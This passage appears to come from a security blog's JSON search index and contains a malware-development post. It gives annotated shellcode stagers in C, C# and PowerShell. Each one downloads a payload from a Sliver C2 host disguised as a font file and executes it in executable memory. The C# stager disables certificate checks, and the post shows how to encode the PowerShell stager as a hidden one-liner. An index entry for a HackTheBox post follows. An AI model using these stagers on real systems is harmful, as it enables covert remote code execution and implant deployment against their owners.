InternetCloseHandle(connection);Closes the internet connection handle.     InternetCloseHandle(session);Closes the internet session handle.      struct Shellcode out;Defines a variable of type Shellcode to hold the downloaded shellcode.     out.data = payload;Assigns the payload to the Shellcode variable.     out.len = payloadSize;Assigns the payload size to the Shellcode variable.     return out;Returns the downloaded shellcode. }End of Download function.  void Execute(Shellcode shellcode) {Function to execute the downloaded shellcode.     void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);Allocates memory with execute permissions.     memcpy(exec, shellcode.data, shellcode.len);Copies the shellcode to the allocated memory.     ((void(*)())exec)();Casts the allocated memory as a function and executes it. }End of Execute function.                            C# Stager                   using System;Imports the System namespace, providing fundamental classes and base classes. using System.Net;Imports the System.Net namespace, providing classes for networking, including the WebClient class. using System.Runtime.InteropServices;Imports the System.Runtime.InteropServices namespace, providing types useful for interoperation between managed and unmanaged code.  namespace Sliver_stager {Declares a namespace called Sliver_stager to encapsulate related types.     class Program {Declares a class named Program.         public static void Main(String[] args) {Declares the entry point of the program.             byte[] shellcode = Download(\"http://sliver.labnet.local/fontawesome.woff\");Downloads shellcode from the specified URL.             Execute(shellcode);Executes the downloaded shellcode.             return;Indicates successful termination of the program.         }End of Main method.                  private static byte[] Download(string url) {Declares a method to download shellcode from a URL.             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; true;Disables SSL certificate validation.             System.Net.WebClient client = new System.Net.WebClient();Creates a WebClient instance for downloading data.             byte[] shellcode = client.DownloadData(url);Downloads shellcode data from the specified URL.             return shellcode;Returns the downloaded shellcode.         }End of Download method.                   [DllImport(\"kernel32\")]Declares a method imported from the kernel32 DLL.         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);Defines the VirtualAlloc method for memory allocation.                  [DllImport(\"kernel32\")]Declares a method imported from the kernel32 DLL.         static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);Defines the CreateThread method for thread creation.                  [DllImport(\"kernel32.dll\")]Declares a method imported from the kernel32 DLL.         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);Defines the WaitForSingleObject method for thread synchronization.                  private static void Execute(byte[] shellcode) {Declares a method to execute the downloaded shellcode.             IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);Allocates memory for the shellcode.             Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);Copies the shellcode to the allocated memory.                          IntPtr hThread = IntPtr.Zero;Declares a handle for the thread.             IntPtr threadId = IntPtr.Zero;Declares a variable for the thread ID.             hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);Creates a new thread to execute the shellcode.                          WaitForSingleObject(hThread, 0xFFFFFFFF);Waits for the thread to finish execution.                      return;Indicates successful completion of the method.         }End of Execute method.     }End of Program class. }End of Sliver_stager namespace.                    Powershell Stager                   $Win32 = @\"Defines a PowerShell Here-String that contains C# code. using System;Imports the System namespace. using System.Runtime.InteropServices;Imports the System.Runtime.InteropServices namespace. public class Win32 {Declares a public class named Win32. [DllImport(\"kernel32\")]Declares a method imported from the kernel32 DLL. public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);Defines the VirtualAlloc method for memory allocation. [DllImport(\"kernel32\", CharSet=CharSet.Ansi)]Declares a method imported from the kernel32 DLL with CharSet set to Ansi. public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);Defines the CreateThread method for thread creation. [DllImport(\"kernel32.dll\", SetLastError=true)]Declares a method imported from the kernel32 DLL with SetLastError set to true. public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);Defines the WaitForSingleObject method for thread synchronization. }End of Win32 class definition. \"@End of PowerShell Here-String. Add-Type $Win32Adds the C# code to the PowerShell session, creating the Win32 class. $shellcode = (New-Object System.Net.WebClient).DownloadData(\"http://sliver.labnet.local/fontawesome.woff\")Downloads shellcode from the specified URL using WebClient. if ($shellcode -eq $null) {Exit};Exits the script if shellcode is not downloaded successfully. $size = $shellcode.LengthGets the length of the downloaded shellcode.  [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x1000, 0x40);Allocates memory for the shellcode using the VirtualAlloc method from the Win32 class. [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)Copies the shellcode to the allocated memory. $thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);Creates a new thread to execute the shellcode using the CreateThread method from the Win32 class. [Win32]::WaitForSingleObject($thandle, [uint32]\"0xFFFFFFFF\")Waits for the thread to finish executing the shellcode.                   U can convert the code to base64                if u r on Linux:        cat pw_stager.ps1 | iconv --to-code UTF-16LE | base64 -w 0               Then just execute as an One Liner:        powershell.exe -nop -w hidden -Enc JABXA...QAKAA==                   ","categories": ["maldev"],
        "tags": ["maldev"],
        "url": "/maldev/maldev/",
        "teaser": "/assets/images/posts/c2/c2-teaser.jpg"
      },{
        "title": "How To Start Playing HackTheBox",
        "excerpt":"  ","categories": ["insights"],
        "tags": ["tips","pentest"],
        "url": "/insights/HackTheBox/",
        "teaser": "/assets/images/posts/insights/roadmap/roadmap-teaser1.jpg"
      }]
